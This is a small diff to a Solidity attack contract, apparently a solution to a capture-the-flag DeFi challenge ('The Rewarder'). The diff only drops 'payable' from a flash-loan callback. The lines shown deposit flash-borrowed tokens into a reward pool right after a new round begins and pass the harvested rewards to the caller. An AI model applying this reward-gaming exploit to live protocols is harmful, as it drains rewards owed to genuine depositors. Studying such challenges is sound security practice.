@@ -25,7 +25,7 @@ contract TheRewarderAttack {
         rewardToken.transfer(msg.sender, rewardsAmount);
     }
 
-    function receiveFlashLoan(uint256 amount) external payable {
+    function receiveFlashLoan(uint256 amount) external {
         liquidityToken.approve(address(rewarderPool), amount);
         // It will distribute rewards immediately because we've waited until new round started
         rewarderPool.deposit(amount);
